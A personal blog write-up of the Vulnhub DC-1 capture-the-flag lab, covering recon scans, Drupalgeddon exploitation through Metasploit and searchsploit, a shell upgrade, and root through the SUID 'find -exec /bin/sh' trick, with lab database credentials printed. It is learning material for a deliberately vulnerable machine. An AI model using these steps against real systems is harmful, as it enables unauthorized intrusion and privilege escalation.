---
title: DC1 walk-through/learning notes
date: 2020-09-20 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf
---

# information_collect

first we need locate the machine.

we got command as
```
arp-scan -l
```
or
```
netdiscover
```
```
arp -a		#maybe fail.
```
than i got it on 192.168.242.129

than nmap is we need; nmap can scan the machine with the ports,services,text and so on.so it's really useful when we are in the early information-collection steps of pentest/ctf and other place.

so we go on 

## nmap_scan 

```
nmap -A <ip-address>
```
[explain it](https://www.explainshell.com/explain?cmd=nmap+-A+127.0.0.1)
```
--------------------------nmap result--------------------------------
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 00:15 EDT
Nmap scan report for 192.168.242.129
Host is up (0.00044s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35938/tcp6  status
|   100024  1          37866/udp   status
|   100024  1          45265/udp6  status
|_  100024  1          60683/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
```

### tips

we can find two things needed high-lights;

one is druapl site! //a kind of cms

one is robots.txt //the text will ban the sipder of information collecting

we can curl/access with web broswer.

by the way i use firefox(because it based on my kali default)
```
----------------------found in robots.txt-------------------------
don't allow path is
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```
then for the aim of  information collection

we wanna know which of path we can access.

as (HTTP 200 OK!)

save it and open it in vim

#### tips

>
>use vim command mode as <ESC>
>
>command:
>
>:%s/Disallow: /
>
>this command can replace the Disallow: with a empty space
>
> for more detail you can see:[vim search command](https://harttle.land/2016/08/08/vim-search-in-file.html)

Ok now we can use the dir brute force attack it.

## dir_scan

```
gobuster dir -u http://<ip-address>/ -w /usr/share/wordlists/dirb/big.txt
```
this command means you go an dir attack to the <ip-address>

with wordlists big.txt located in /usr/share/wordlists/dirb 

#### tips
>the location of /usr/share/wordlists is the kali-linux official wordlist"built-in" kali


```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.242.129:80/
[+] Threads:        10
[+] Wordlist:       NOTallow,big
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/19 02:51:01 Starting gobuster
===============================================================
//misc/ (Status: 403)
//modules/ (Status: 403)
//scripts/ (Status: 403)
//profiles/ (Status: 403)
//themes/ (Status: 403)
//INSTALL.pgsql.txt (Status: 200)
//INSTALL.mysql.txt (Status: 200)
//MAINTAINERS.txt (Status: 200)
//UPGRADE.txt (Status: 200)
//LICENSE.txt (Status: 200)
//INSTALL.txt (Status: 200)
//INSTALL.sqlite.txt (Status: 200)
//includes/ (Status: 403)
//install.php (Status: 200)
//xmlrpc.php (Status: 200)
//cron.php (Status: 403)
//node/add/ (Status: 403)
//admin/ (Status: 403)
//filter/tips/ (Status: 200)
//search/ (Status: 403)
//update.php (Status: 403)
//user/register/ (Status: 200)
//user/password/ (Status: 200)
//user/login/ (Status: 200)
//user/logout/ (Status: 403)
//?q=admin/ (Status: 403)
//?q=node/add/ (Status: 403)
//?q=filter/tips/ (Status: 200)
//?q=search/ (Status: 403)
//?q=user/password/ (Status: 200)
//?q=user/register/ (Status: 200)
//?q=user/logout/ (Status: 403)
//?q=user/login/ (Status: 200)
/.bashrc (Status: 403)
/.cvs (Status: 403)
/.bash_history (Status: 403)
/.forward (Status: 403)
/.cvsignore (Status: 403)
/.history (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.listing (Status: 403)
/.passwd (Status: 403)
/.perf (Status: 403)
/.profile (Status: 403)
/.rhosts (Status: 403)
/.ssh (Status: 403)
/.subversion (Status: 403)
/.svn (Status: 403)
/.web (Status: 403)
/0 (Status: 200)
/ADMIN (Status: 403)
/Admin (Status: 403)
/Entries (Status: 403)
/LICENSE (Status: 200)
/README (Status: 200)
/Root (Status: 403)
/Search (Status: 403)
/admin (Status: 403)
/batch (Status: 403)
/cgi-bin/ (Status: 403)
/includes (Status: 301)
/misc (Status: 301)
/modules (Status: 301)
/node (Status: 200)
/profiles (Status: 301)
/robots.txt (Status: 200)
/robots (Status: 200)
/scripts (Status: 301)
/search (Status: 403)
/server-status (Status: 403)
/sites (Status: 301)
/themes (Status: 301)
/user (Status: 200)
```

## cms_scan

### wp_scan

after scanning the dir,to the cms:drupal itself i want know more.

but now i got a mistake that the cms scanner WP-scan is built-in kali.
so i use the wp-scan in this step. 

```
---------------------------------wpscan result----------------------------------------------------
 wpscan --url http://192.168.242.129 --wp-content-dir /user --force            
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://192.168.242.129/ [192.168.242.129]
[+] Started: Sat Sep 19 03:46:24 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.2.22 (Debian)
 |  - X-Powered-By: PHP/5.4.45-0+deb7u14
 |  - Content-Language: en
 |  - X-Generator: Drupal 7 (http://drupal.org)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.242.129/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.242.129/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] A backup directory has been found: http://192.168.242.129/user/backup-db/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 70%
 | Reference: https://github.com/wpscanteam/wpscan/issues/422

[+] This site has 'Must Use Plugins': http://192.168.242.129/user/mu-plugins/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 80%
 | Reference: http://codex.wordpress.org/Must_Use_Plugins

Fingerprinting the version - Time: 00:00:25 <=============> (463 / 463) 100.00% Time: 00:00:25
[i] The WordPress version could not be detected.

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Sep 19 03:46:52 2020
[+] Requests Done: 486
[+] Cached Requests: 49
[+] Data Sent: 96.949 KB
[+] Data Received: 215.362 KB
[+] Memory used: 152.605 MB
[+] Elapsed time: 00:00:27
```

## droopescan

after watching the google,i found my fault and search for the drupal-oriented cms scanner.

THE DROOPESCANERRRRRRRRRR.

i scan the website again..
```
---------------------------droopescan result-------------------------------------------
┌──(kali㉿EsonhughKALI-Desktop)-[~]
└─$ droopescan scan drupal -u 192.168.242.129
[+] Plugins found:                                                              
    ctools http://192.168.242.129/sites/all/modules/ctools/
        http://192.168.242.129/sites/all/modules/ctools/LICENSE.txt
        http://192.168.242.129/sites/all/modules/ctools/API.txt
    views http://192.168.242.129/sites/all/modules/views/
        http://192.168.242.129/sites/all/modules/views/README.txt
        http://192.168.242.129/sites/all/modules/views/LICENSE.txt
    profile http://192.168.242.129/modules/profile/
    php http://192.168.242.129/modules/php/
    image http://192.168.242.129/modules/image/

[+] Themes found:
    seven http://192.168.242.129/themes/seven/
    garland http://192.168.242.129/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://192.168.242.129/user/login

[+] Scan finished (0:05:01.892400 elapsed)
```

#### tips

a little break for mind

so what`s the most important or vulnerable in hacking an cms??
>1) version
>>why?
>>
>>version of some cms can find exp on internet or use command
>> ``` 
>> searchsploit xxx		#xxx can replace with the software,versions
>> ```

>2)themes and plugins
>>there are many careless developer use unsafe codes.
>>
>>and the theme and plugins will get high level privilege when the web server runs.
>>
>>so if you can edit with them or upload them you can use evil php code/js code/.. to privilege you (get root) and get shell.

>3)vulnerable setting file or profiles
>>if any high privilege setting file is avaiable to anonymous users/low privilege users 
>>
>>it will make more unsafe factors in your sys,make more damage and cause unpredictable results.
>>  

so with guides, we can see the version is 7.22-7.26

---

# to getshell

## drupal vulnerability with msf

if we see this versio in metasploit or searchsploit.

we can got the exp of it

Drupageddon! is!
```
$msfconsole
$search drupal
$use 4		#(may other number)
$info
$#here give our machine infomation the exp need...
run		#just run it

```
then we can got www-data//shell

get shell!

but the interface is really bad

#### tips

>
>using python command
>```
>python -c import pty;pty.spawn("/bin/bash")
>```
get shell
---

## SQL injections Way

also it got SQLinjections too. searchsploit can help you and create an admin userof you.

```
$ searchsploit drupal 7
 ------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                       |  Path (/usr/share/exploitdb/)
 ------------------------------------------------------------------------------------------------------------------

Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)    | exploits/php/webapps/34992.py
```
than looking my guide two,use upload plugins or themes in drupal to install shells and nc to create the backdoor.

we can use msf and create the backdoor phps. 

the passage [here](https://stoeps.de/2020/01/05/20200104-walkthrough-dc1/) has more detail.


## SQL injections unknown way??


also if you know the sql injection how to create may you can use the sql to pump your shell out.

but i fail..if anyone can i hope he/she can tell me just send me email...


```






big BLANK to clear you mind,make it as a buffer...








```
---

# level up your permission

#### tips

frist clear your mind

now we got shell.

we need to ask 3 question as a Philosopher.

>1) who am i?
>
>2)what can i do?
>
>3)where i will go?

the answer is clear.

>whoami:www-data
>
>use command "whoami"/"id" to get detail infomation

>what can i do?
>
>to sure that we can use command
>>as
>>```
>>compgen -a		#(alias)
>>	-u		#(user)
>>	-c		#(command)
>>```
>but in some place as our own kali,this command is banned.
>
>also if find/locate command can use we can got the more deeper searching ability
>
>as we can search the flags or other useful things when pentest.

>where i will go?
>
>it is also clear
>
>RRRRRRROOOOOOOOOOOOOOOOOOOOTTTTTTT!!!

## little try:sudo

frist we can use sudo can see some script or command you can use as root

NOTHING!it is fucking NOTHING!

## try a little bit:suid

then what we can do?

sudo fail,but suid can!
you can see any suid by this way

 as follow..

```
$find / -perm -u=s -type f 2>/dev/null
#or you can use
$find / -perm /4000
```
[what is this command?frist one](https://www.explainshell.com/explain?cmd=find+%2F+-perm+u%3Ds+2%3E+%2Fdev%2Fnull)
[what is this command?second one](https://www.explainshell.com/explain?cmd=find+%2F+-perm+%2F4000)
```
output>
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
user:www-data
```

>i got mistake there too.
>i think may the procmail is the key
>but actually not;
>

#### tips

>so how i got this idea?(means to use the suid)
>
> it is TOP2 easiest way to get  shell(one is sudo)
>
>recommend one [site](https://gtfobins.github.io/#) for wrong settings to privilege users
>
>use it as an cheatsheet...have fun~
>
>so you can easily find the `find` command suid to root it.

command is following.

## use find command level up

```
find . -exec '/bin/sh' \;-quit
```
also explain [it](https://www.explainshell.com/explain?cmd=find+.+-exec+%27%2Fbin%2Fsh%27+%5C%3B-quit)

---

## no direct way but a little twist way

another way

 we can broswer the file system...

like this~ 

```
ls -al 
total 408
drwxr-xr-x  3 www-data www-data   4096 Nov 21  2013 .
drwxr-xr-x 42 www-data www-data   4096 Nov 21  2013 ..
drwxr-xr-x  2 www-data www-data   4096 Nov 21  2013 tests
-rw-r--r--  1 www-data www-data    595 Nov 21  2013 user-picture.tpl.php
-rw-r--r--  1 www-data www-data   1001 Nov 21  2013 user-profile-category.tpl.php
-rw-r--r--  1 www-data www-data    918 Nov 21  2013 user-profile-item.tpl.php
-rw-r--r--  1 www-data www-data   1689 Nov 21  2013 user-profile.tpl.php
-rw-r--r--  1 www-data www-data    510 Nov 21  2013 user-rtl.css
-rw-r--r--  1 www-data www-data  39444 Nov 21  2013 user.admin.inc
-rw-r--r--  1 www-data www-data  15764 Nov 21  2013 user.api.php
-rw-r--r--  1 www-data www-data   1827 Nov 21  2013 user.css
-rw-r--r--  1 www-data www-data    356 Nov 21  2013 user.info
-rw-r--r--  1 www-data www-data  29469 Nov 21  2013 user.install
-rw-r--r--  1 www-data www-data   6568 Nov 21  2013 user.js
-rw-r--r--  1 www-data www-data 141243 Nov 21  2013 user.module
-rw-r--r--  1 www-data www-data  21779 Nov 21  2013 user.pages.inc
-rw-r--r--  1 www-data www-data   2723 Nov 21  2013 user.permissions.js
-rw-r--r--  1 www-data www-data  99132 Nov 21  2013 user.test
-rw-r--r--  1 www-data www-data   4093 Nov 21  2013 user.tokens.inc
file *
tests:                         directory
user-picture.tpl.php:          PHP script, ASCII text
user-profile-category.tpl.php: PHP script, ASCII text
user-profile-item.tpl.php:     PHP script, ASCII text
user-profile.tpl.php:          PHP script, ASCII text
user-rtl.css:                  ASCII text
user.admin.inc:                PHP script, ASCII text, with very long lines
user.api.php:                  PHP script, ASCII text
user.css:                      ASCII text
user.info:                     ASCII text
user.install:                  PHP script, ASCII text, with very long lines
user.js:                       ASCII text
user.module:                   PHP script, ASCII text, with very long lines
user.pages.inc:                PHP script, ASCII text, with very long lines
user.permissions.js:           ASCII text
user.test:                     C++ source, UTF-8 Unicode text, with very long lines
user.tokens.inc:               PHP script, ASCII text
pwd
/var/www/modules/user
```

you can see flag1.txt in your www-data root dir

it tell us to see the setting file

to carefully visit the file system.

you can find the setting.php

also it's flag2;

it tell us the mysql database username and pass

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

so get in the mysql database you can see the admin pass(with encrypted one) 

#### tips

google is also a tips.

google"forget admin pass of drupal" can tell us drupal 7 encypt method and other way to access the drupal dashboard.

so the method is you can both crack or change the pass in mysql or use drupal console to reset it. 

make damage is whatever because nobody use this drupal but you. :)

the backend has the article by admin,it's a hint.
```
Url is
http://<ip-address>/node/2#overlay-context=shell
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

Unh..go to the method 1 use find command to get shell~~;

---

# WIN

now you are root!
WIN!!!!!
```
ls
thefinalflag.txt

cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```
-------------success-------------

---

thank you for watching~I am Esonhugh,this is the frist blog for me.
